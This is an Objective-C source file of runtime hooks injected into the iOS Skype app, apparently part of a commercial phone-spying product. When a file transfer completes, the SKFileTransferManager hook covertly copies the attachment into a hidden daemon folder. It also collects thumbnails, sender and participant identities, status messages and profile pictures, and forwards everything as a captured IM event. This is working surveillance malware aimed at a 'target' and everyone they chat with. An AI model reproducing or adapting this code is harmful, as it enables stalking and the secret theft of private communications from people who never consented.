HOOK(SKFileTransferManager, observeValueForKeyPath$ofObject$change$context$, void, id arg1, id arg2, id arg3, void *arg4) {
	
	//CALL_ORIG(SKFileTransferManager, observeValueForKeyPath$ofObject$change$context$, arg1, arg2, arg3, arg4);
	
	DLog(@"------------------- observeValueForKeyPath$ofObject$change$context$ ------------------");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]);
	DLog(@"arg2 = %@", arg2);
	DLog(@"[arg3 class] = %@", [arg3 class]);
	DLog(@"arg3 = %@", arg3);
	DLog(@"arg4 = %@", arg4);
	DLog(@"------------------- observeValueForKeyPath$ofObject$change$context$ ------------------");
	
	SKTransferMessage *transferMessage = arg2;
	DLog(@"------------------- arg2 (SKTransferMessage) ------------------");
	DLog(@"isTransfering = %d", [transferMessage isTransfering]);
	DLog(@"type = %d", [transferMessage type]);
	DLog(@"failureReason = %d", [transferMessage failureReason]);
	DLog(@"status = %d", [transferMessage status]);
	DLog(@"bytesPerSecond = %d", [transferMessage bytesPerSecond]);
	DLog(@"bytesTransfered = %d", [transferMessage bytesTransferred]);
	DLog(@"filesize = %d", [transferMessage filesize]);
	DLog(@"transferType = %d", [transferMessage transferType]);
	DLog(@"pathname = %@", [transferMessage pathname]);
	DLog(@"filename = %@", [transferMessage filename]);
	DLog(@"------------------- arg2 (SKTransferMessage) ------------------");
 
	if (![transferMessage isTransfering]																				&&
		([transferMessage bytesTransferred] > 0	&& [transferMessage bytesTransferred] <= [transferMessage filesize])	&& // If bytesTransfered is equal 0 when transfering is completed attachment lost!!! (mostly very small photo < 2 kb)
		([transferMessage failureReason] == -1 || [transferMessage failureReason] == 0)									){
		
		// Searching message in converstation manager
		SKMessage *msgObj = nil;
		SKConversation *conversation = nil;
		NSArray *conversations = nil;
		
		Class $SKConversationManager = objc_getClass("SKConversationManager");
		SKConversationManager *conversationManager = [$SKConversationManager sharedManager];
		
		DLog (@"observingKeyPathsForLiveConversations = %@", [$SKConversationManager observingKeyPathsForLiveConversations]);
		DLog (@"observingKeyPathsForInboxConversations = %@", [$SKConversationManager observingKeyPathsForInboxConversations]);
		
		/// This method doesn't exist in Skype version 4.8, but exist in Skype version 4.6
		if ([conversationManager respondsToSelector:@selector(loadConversations)]) {
			DLog (@">>>>> Skype version 4.6 or eariler");
			
			[conversationManager loadConversations];
			conversations = [conversationManager inboxConversations];
			
			DLog(@"$SKConversationManager = %@", $SKConversationManager);
			DLog(@"conversationManager = %@", conversationManager);
			DLog(@"conversations = %@", [conversationManager conversations]);
			DLog(@"inboxConversations = %@", [conversationManager inboxConversations]);
			DLog(@"liveConversations = %@", [conversationManager liveConversations]);
			DLog(@"imLiveConversations = %@", [conversationManager imLiveConversations]);
			DLog(@"unreadConversations = %@", [conversationManager unreadConversations]);
			
		} else {
			DLog (@">>>>> Skype version 4.8");
			
			DLog (@"Cached conversations = %@", [self cachedConversations]);
			DLog (@"Cached transferMessages = %@", [self cachedTransferMessages]);
			
			conversations = [NSArray arrayWithArray:[self cachedConversations]];
		}
		
		//
		for (SKConversation *convs in conversations) {
			conversation		= convs;
			NSArray *messages	= [convs messages];
			NSEnumerator *enumerator = [messages reverseObjectEnumerator];
			while (msgObj = [enumerator nextObject]) {
				if ([msgObj transferMessage] == transferMessage) {
					DLog(@"Found message from the conversation... %@", msgObj);
					break;
				}
			}
			
			if ([msgObj transferMessage] == transferMessage) {
				DLog(@"............................");
				break;
			}
		}
		
		//
		if ([[SkypeUtils sharedSkypeUtils] mLastSKMessage] != msgObj) {
			
			[[SkypeUtils sharedSkypeUtils] setMLastSKMessage:msgObj];
			
			//NSString *message = [msgObj body];
			NSString *message = @"";
			NSString *userId = [msgObj identity];
			NSString *userDisplayName = [msgObj authorDisplayName];
			NSString *imServiceId = @"skp";
			NSString *senderStatusMessage = nil;
			NSData *senderPictureData	= nil;
			
			// Direction
			int direction = kEventDirectionUnknown;
			if ([msgObj isOutbound]) {
				direction = kEventDirectionOut;
			} else {
				direction = kEventDirectionIn;
			}
			// Participants: Skype store everyone in conversation
			NSArray *origParticipants = [conversation participants];
			DLog (@"origParticipants %@", origParticipants)
			
			NSMutableArray *tempParticipants = [origParticipants mutableCopy];
			// Remove sender from participants list
			for (int i=0; i < [origParticipants count]; i++) {
				if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
					// -- get sender's status message
					SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
					senderStatusMessage = [contact moodMessage];			
					senderPictureData = [contact avatarImageData];
					DLog (@"senderPictureData %d", [senderPictureData length])
					//[senderPictureData writeToFile:@"/tmp/skypeImageIn.jpg" atomically:YES];
					[tempParticipants removeObjectAtIndex:i];
					break;
				}
			}
			
			Class $SKAccountManager(objc_getClass("SKAccountManager"));
			SKAccount *currentAccount			= [[$SKAccountManager sharedManager] currentAccount];	// SKAccount
			DLog (@"account identity %@", [currentAccount identity])
			
			// Map to FxRecipient array
			NSMutableArray *finalParticipants = [NSMutableArray array];
			for (SKParticipant *obj in tempParticipants) {
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:[obj identity]];
				[participant setRecipContactName:[obj displayName]];
				[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
				DLog (@">>> CONTACT PICTURE: %d", [[[obj contact] avatarImageData] length])
				[participant setMPicture:[[obj contact] avatarImageData]];	
				DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
				//DLog (@"> participant picture   %d", [[[obj contact] avatarImageData] length])
				//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];
				
				if ([[obj identity] isEqualToString:[(SKAccount *)currentAccount identity]]) {		// target									
					DLog (@"target so insert at 1st index")
					[finalParticipants insertObject:participant	atIndex:0];
					
				} else {																			// not target
					[finalParticipants addObject:participant];				
				}			
				[participant release];
			}
			[tempParticipants release];
			
			DLog(@"mDirection->%d", direction);
			DLog(@"mUserID->%@", userId);
			DLog(@"mUserDisplayName->%@", userDisplayName);
			DLog(@"mParticipants->%@", finalParticipants);
			DLog(@"mIMServiceID->%@", imServiceId);
			DLog(@"mMessage->%@", message);
			DLog(@"mAttachments->%d", [msgObj isChatMessage]);
			DLog (@"converstion displayName = %@", [conversation displayName]);
			DLog (@"conversationIdentifier = %@", [conversation conversationIdentifier])
			
			NSString *skypeAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSkype/"];
			NSString *saveFilePath = [skypeAttachmentPath stringByAppendingString:[[msgObj transferMessage] filename]];
			NSString *originpath = [[msgObj transferMessage] pathname];
			NSError *error = nil;
			NSFileManager *fileManager = [NSFileManager defaultManager];
			DLog(@"File is exist = %d", [fileManager fileExistsAtPath:originpath]);
			
			
			// Attachment...
			FxAttachment *attachment = [[FxAttachment alloc] init];
			
			if ([fileManager fileExistsAtPath:originpath]) {
				[fileManager removeItemAtPath:saveFilePath error:&error];
				DLog (@"Remove file error = %@", error);
				error = nil;
				[fileManager copyItemAtPath:originpath toPath:saveFilePath error:&error];
				DLog (@"Copy file error = %@", error);
				
				[attachment setFullPath:saveFilePath];			// Attachment Fullpath
			} else {
				[attachment setFullPath:@"image/jpeg"];			// Attachment Fullpath				
			}
											
			DLog (@"saveFilePath %@", saveFilePath)
			if (direction == kEventDirectionOut) {
				NSString *thumbnailPath = [[[msgObj transferMessage] pathname] stringByDeletingPathExtension];
				thumbnailPath = [thumbnailPath stringByAppendingString:@"-thumb.jpg"];
				[attachment setMThumbnail:[NSData dataWithContentsOfFile:thumbnailPath]];
			} else if (direction == kEventDirectionIn) {
				NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
				UIImage *image = [UIImage imageWithContentsOfFile:[[msgObj transferMessage] pathname]];
				Class $SKImageScaler = objc_getClass("SKImageScaler");
				UIImage *thumbnailImage = [$SKImageScaler scaleImage:image toFillTargetSize:CGSizeMake(600,600)];
				[attachment setMThumbnail:UIImageJPEGRepresentation(thumbnailImage, 1.0)];
				[pool release];
			}
			
			FxIMEvent *imEvent = [[FxIMEvent alloc] init];
			[imEvent setMUserID:userId];
			[imEvent setMIMServiceID:imServiceId];
			[imEvent setMDirection:(FxEventDirection)direction];
			[imEvent setMMessage:message];
			[imEvent setMUserDisplayName:userDisplayName];		
			[imEvent setMParticipants:finalParticipants];
			[imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			// new
			[imEvent setMServiceID:kIMServiceSkype];						
			[imEvent setMRepresentationOfMessage:kIMMessageNone];		// photo message			
			[imEvent setMConversationID:[conversation conversationIdentifier]];
			[imEvent setMConversationName:[conversation displayName]];
			[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
			[imEvent setMUserPicture:senderPictureData];				// sender image profile
			[imEvent setMConversationPicture:nil];
			[imEvent setMUserLocation:nil];
			[imEvent setMShareLocation:nil];
			
			[SkypeUtils sendSkypeEvent:imEvent];
			[attachment release];
			[imEvent release];
		}
	}
	
	CALL_ORIG(SKFileTransferManager, observeValueForKeyPath$ofObject$change$context$, arg1, arg2, arg3, arg4);
}

HOOK(DomainObjectPool, init, id) {
	DomainObjectPool *objectsPool = CALL_ORIG(DomainObjectPool, init);
	DLog (@"Hook get objectsPool = %@", objectsPool);
	SkypeUtils *skypeUtils = [SkypeUtils sharedSkypeUtils];
	[skypeUtils setMDomainObjectPool:objectsPool];
	return objectsPool;
}
